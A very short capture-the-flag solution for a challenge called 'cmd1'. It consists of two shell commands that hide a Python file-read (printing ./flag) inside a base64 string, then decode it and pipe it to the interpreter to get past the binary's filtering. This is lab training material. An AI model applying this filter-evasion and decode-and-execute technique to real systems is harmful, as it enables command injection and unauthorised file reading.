# `cmd1` Solution

First I:

    base64 read.py | python -c "import sys;print 'echo %s | base64 -d | python' % sys.stdin.read().replace('\n', '')"

end then:

    ./cmd1 "echo CnByaW50IG9wZW4oIi4vZmxhZyIsICJyIikucmVhZCgp | /usr/bin/base64 -d | /usr/bin/python"